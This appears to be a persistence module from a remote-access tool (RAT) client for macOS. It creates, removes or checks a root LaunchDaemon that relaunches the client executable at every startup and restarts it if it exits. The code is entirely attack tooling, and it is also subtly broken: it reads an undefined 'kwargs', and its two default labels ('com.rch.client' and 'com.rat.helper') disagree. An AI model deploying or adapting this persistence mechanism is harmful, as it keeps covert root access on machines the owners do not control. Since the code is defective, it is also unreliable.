SCRIPT_METADATA = {
    "name": "mac/persist/launchdaemon",
    "display_name": "Manage LaunchDaemon",
    "description": "Create, remove, or check status of a persistent LaunchDaemon that runs as root at system startup",
    "platforms": ["macos"],
    "category": "Persistence",
    "params": [
        {
            "name": "label",
            "type": "string",
            "required": False,
            "default": "com.rch.client",
            "description": "Unique identifier for the LaunchDaemon"
        },
        {
            "name": "keep_alive",
            "type": "boolean",
            "required": False,
            "default": True,
            "description": "Automatically restart the daemon if it exits"
        },
        {
            "name": "action",
            "type": "select",
            "required": False,
            "default": "status",
            "options": ["create", "remove", "status"],
            "description": "Action to perform on the LaunchDaemon"
        }
    ]
}

import subprocess
import os
from client.runtime.client_util import get_executable_path


def manage_launchdaemon(script_path):
    label = kwargs.get('label', 'com.rat.helper')
    keep_alive = kwargs.get('keep_alive', True)
    action = kwargs.get('action', 'status')

    plist_path = f'/Library/LaunchDaemons/{label}.plist'

    if action == 'status':
        # Check if plist file exists
        if os.path.exists(plist_path):
            print(f'✓ Plist file exists: {plist_path}')
            # Check if loaded in launchd
            result = subprocess.run(['sudo', 'launchctl', 'list', label], capture_output=True, text=True)
            if result.returncode == 0 and 'PID' in result.stdout:
                print(f'✓ Daemon is loaded and running')
            else:
                print(f'✗ Daemon is not loaded')
        else:
            print(f'✗ Daemon not installed: {plist_path}')
        return

    if action == 'remove':
        subprocess.run(['sudo', 'launchctl', 'unload', plist_path], capture_output=True)
        if os.path.exists(plist_path):
            subprocess.run(['sudo', 'rm', plist_path])
            print(f'✓ Daemon removed: {plist_path}')
        else:
            print(f'✗ Daemon not found: {plist_path}')
        return

    # create action
    plist = {
        'Label': label,
        'ProgramArguments': ['/bin/sh', '-c', script_path],
        'RunAtLoad': True,
        'KeepAlive': keep_alive,
        'StandardOutPath': f'/tmp/{label}.out',
        'StandardErrorPath': f'/tmp/{label}.err',
        'UserName': 'root'
    }

    with open(plist_path, 'wb') as f:
        import plistlib
        plistlib.dump(plist, f)

    subprocess.run(['sudo', 'launchctl', 'load', plist_path])
    print(f'✓ Daemon created: {plist_path}')


manage_launchdaemon(get_executable_path())